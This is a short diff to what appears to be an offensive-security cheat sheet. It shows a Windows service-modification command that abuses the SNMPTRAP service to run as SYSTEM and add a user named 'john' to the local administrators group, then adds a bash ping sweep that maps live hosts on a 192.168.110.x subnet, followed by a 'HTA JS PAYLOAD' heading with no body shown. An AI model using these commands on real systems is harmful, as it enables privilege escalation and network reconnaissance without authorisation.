@@ -3,6 +3,9 @@ Service Modify
 ```powershell
 sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add" start= "demand" obj= "NT AUTHORITY\SYSTEM" password= ""
 ```
+```bash
+for i in {1..255} ;do (ping -c 1 192.168.110.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
+```
 
 HTA JS PAYLOAD
 ---------------------
